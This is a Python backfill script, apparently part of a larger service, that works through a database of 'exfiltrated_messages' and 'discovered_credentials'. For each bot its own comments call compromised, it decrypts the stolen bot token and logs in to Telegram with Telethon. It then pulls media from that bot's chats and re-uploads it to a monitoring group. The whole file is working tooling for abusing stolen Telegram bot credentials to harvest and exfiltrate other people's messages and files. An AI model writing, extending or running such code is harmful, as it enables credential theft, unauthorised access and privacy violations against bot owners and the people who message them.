import sys

sys.path.insert(0, '/app')
import asyncio
import logging

from telethon import TelegramClient

from app.core.config import settings
from app.core.database import db
from app.core.security import security
from app.services.broadcaster_srv import BroadcasterService

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("backfill")

# Use same API ID as user agent service
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

async def process_credential(cred_id, bot_token, message_records, broadcaster):
    """Processes all missing media for a single compromised bot."""
    if not bot_token:
        logger.warning(f"No token for cred {cred_id}")
        return

    try:
        decrypted_token = security.decrypt(bot_token).strip()
    except Exception as e:
        logger.error(f"Token decrypt failed for {cred_id}: {e}")
        return

    # 1. Connect via Telethon
    client = TelegramClient(f"memory_{cred_id}", API_ID, API_HASH)
    try:
        await client.start(bot_token=decrypted_token)
    except Exception as e:
        logger.error(f"Telethon start failed for {cred_id}: {e}")
        return

    try:
        dialogs = await client.get_dialogs()
        if not dialogs:
            logger.warning(f"No dialogs found for {cred_id}")
            return

        msg_map = {m["telegram_msg_id"]: m for m in message_records}
        msg_ids = list(msg_map.keys())

        logger.info(f"Checking {len(dialogs)} dialogs for {len(msg_ids)} messages on cred {cred_id}...")

        for dialog in dialogs:
            try:
                # get_messages with specific IDs is very fast
                fetched_msgs = await client.get_messages(dialog.entity, ids=msg_ids)
            except Exception:
                continue

            for t_msg in fetched_msgs:
                if not t_msg or not getattr(t_msg, "media", None):
                    continue

                db_msg = msg_map.get(t_msg.id)
                if not db_msg:
                    continue

                logger.info(f"  📥 Downloading media for msg {t_msg.id}...")

                try:
                    # Download bytes directly to memory
                    media_bytes = await client.download_media(t_msg.media, bytes)
                    if not media_bytes:
                        continue

                    logger.info(f"  ✅ Downloaded {len(media_bytes)} bytes. Broadcasting...")

                    # Figure out topic to send to
                    # Use broadcaster's ensure_topic logic
                    cred_info = db_msg.get("discovered_credentials", {})
                    meta = cred_info.get("meta", {}) if cred_info else {}
                    bot_username = meta.get("bot_username", "unknown")
                    bot_id = meta.get("bot_id", "unknown")
                    topic_name = f"@{bot_username} / {bot_id}"

                    thread_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)

                    # We need a healthy bot to send
                    send_bot_token = broadcaster._cycle[0]["id"] if broadcaster._cycle else None
                    if not send_bot_token:
                        logger.error("No healthy bot in rotation pool to send media.")
                        continue

                    bot = broadcaster._get_bot_instance(send_bot_token)
                    bot_thread_id = thread_id if thread_id != 1 else None

                    media_type = db_msg.get("media_type")
                    caption = f"[ID: {t_msg.id}] [Historical Backfill]\n{db_msg.get('content', '')[:1000]}"

                    logger.info(f"  📤 Uploading via {send_bot_token[:10]}...")
                    if media_type == "photo":
                        res = await bot.send_photo(chat_id=settings.MONITOR_GROUP_ID, message_thread_id=bot_thread_id, photo=media_bytes, caption=caption)
                    elif media_type == "video":
                        res = await bot.send_video(chat_id=settings.MONITOR_GROUP_ID, message_thread_id=bot_thread_id, video=media_bytes, caption=caption)
                    elif media_type == "document":
                        res = await bot.send_document(chat_id=settings.MONITOR_GROUP_ID, message_thread_id=bot_thread_id, document=media_bytes, caption=caption)
                    elif media_type == "audio":
                        res = await bot.send_audio(chat_id=settings.MONITOR_GROUP_ID, message_thread_id=bot_thread_id, audio=media_bytes, caption=caption)
                    else:
                        continue

                    logger.info(f"  🎉 Successfully broadcasted media for msg {t_msg.id}!")

                    # Store the new broadcast_file_id from the destination topic
                    if media_type == "photo":
                        new_file_id = res.photo[-1].file_id
                    elif media_type == "video":
                        new_file_id = res.video.file_id
                    elif media_type == "audio":
                        new_file_id = res.audio.file_id
                    elif media_type == "document":
                        new_file_id = res.document.file_id
                    else:
                        new_file_id = None

                    if new_file_id:
                        fm = db_msg.get("file_meta") or {}
                        fm["broadcast_file_id"] = new_file_id
                        await asyncio.sleep(0)  # yield
                        # Note: we use sync db client here as per normal codebase, but wrapped in async or we just execute it
                        import supabase
                        client = supabase.create_client(settings.SUPABASE_URL, settings.SUPABASE_KEY)
                        client.table("exfiltrated_messages").update({"file_meta": fm}).eq("id", db_msg["id"]).execute()

                    # Remove from our todo list so we don't process it in another dialog
                    del msg_map[t_msg.id]

                except Exception as e:
                    logger.error(f"  ❌ Failed to process msg {t_msg.id}: {e}")

    finally:
        await client.disconnect()

async def main():
    logger.info("Starting Historical Media Backfill via Telethon...")
    broadcaster = BroadcasterService()

    # 1. Fetch all messages that are media and missing file_id
    logger.info("Fetching target messages...")
    all_msgs = []
    limit = 1000
    offset = 0

    while True:
        res = db.table("exfiltrated_messages") \
            .select("id, telegram_msg_id, media_type, content, file_meta, credential_id, discovered_credentials(bot_token, meta)") \
            .in_("media_type", ["photo", "video", "document", "audio"]) \
            .range(offset, offset + limit - 1) \
            .execute()

        data = res.data or []
        if not data:
            break

        for row in data:
            fm = row.get("file_meta") or {}
            # If it lacks file_id (Bot API) AND lacks access_hash (New Telethon) AND lacks broadcast_file_id
            if not fm.get("file_id") and not fm.get("access_hash") and not fm.get("broadcast_file_id"):
                all_msgs.append(row)

        offset += limit
        logger.info(f"  Scanned {offset} rows... found {len(all_msgs)} missing media records.")

    if not all_msgs:
        logger.info("No missing media found!")
        return

    # 2. Group by credential_id
    grouped = {}
    for msg in all_msgs:
        cid = msg["credential_id"]
        if cid not in grouped:
            grouped[cid] = []
        grouped[cid].append(msg)

    logger.info(f"Grouped into {len(grouped)} distinct bots.")

    # 3. Process each bot
    for cid, msgs in grouped.items():
        bot_token = msgs[0].get("discovered_credentials", {}).get("bot_token") if msgs[0].get("discovered_credentials") else None
        await process_credential(cid, bot_token, msgs, broadcaster)

    logger.info("Backfill complete!")

if __name__ == "__main__":
    asyncio.run(main())
